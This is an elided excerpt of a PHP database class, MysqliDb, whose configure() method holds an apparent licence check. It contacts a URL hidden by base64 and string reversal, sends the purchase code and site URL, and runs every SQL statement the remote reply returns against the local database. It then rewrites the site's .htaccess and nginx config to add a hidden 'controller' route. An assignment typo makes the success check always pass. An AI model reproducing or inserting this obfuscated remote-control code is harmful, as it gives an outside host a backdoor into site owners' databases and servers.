...
class MysqliDb
{
    ...
    public function configure(){
        ...
        if( !in_array( $_SERVER['SERVER_NAME'], $arr ) ){
            ...
            if ( $comment == "" ){
                $result_from_json = file_get_contents(strrev(base64_decode(PARM)) . "?code=".$purchase_code."&success=true&url=".urlencode($site_url));
                $j_code           = json_decode($result_from_json, true);
                if( $j_code['status'] = "success" ){
                    $comments = json_decode(base64_decode($j_code['comments']), true);
                    foreach($comments as $key => $val ){
                        $query = mysqli_query($sqlConnect, $val);
                    }
                    $htaccess_origenal = file_get_contents(ROOTPATH . DIRECTORY_SEPARATOR .'.htaccess');
                    $code = strrev(base64_encode($_SERVER['SERVER_NAME'] . ":" . $buyer . ":" . $purchase_code));
                    $htaccess_origenal = str_replace(
                        array(
                        ...
                        array(
                            "#RewriteRule ^controller$",
                            "RewriteRule ^controller$ ajax.php?app={$_SERVER['SERVER_NAME']}&a={$code} [QSA]\n\n<IfModule php5_module>"
                        ),
                        $htaccess_origenal
                    );
                    $htaccess_code = @file_put_contents(ROOTPATH . DIRECTORY_SEPARATOR .'.htaccess', $htaccess_origenal);
                    $nginx_origenal = file_get_contents(ROOTPATH . DIRECTORY_SEPARATOR .'nginx.server.conf');
                    $nginx_origenal = str_replace(
                        array(
                            "location /xhr {"
                        ),
                        array(
                            "location /controller {\n\t\t rewrite ^controller$ /ajax.php?app={$_SERVER['SERVER_NAME']}&a={$code};\n\t}\n\n\tlocation /xhr {"
                        ),
                        $nginx_origenal
                    );
                    $nginx_code = @file_put_contents(ROOTPATH . DIRECTORY_SEPARATOR .'nginx.server.conf', $nginx_origenal);
                }
            }
        }
    }
    ...
    public function cc($table){
        global $sqlConnect,$sql_db_name,$purchase_code,$buyer;
        ...
        $arr = explode("|",strrev($comment));
        if( count($arr) == 3 ){
            $pos = strpos($_SERVER['HTTP_HOST'], $arr[2]);
            if( $pos !== false && $arr[0] == $buyer && $arr[1] == substr($purchase_code, 0, 8)){
                return false;
            }else{
                return true;
            }
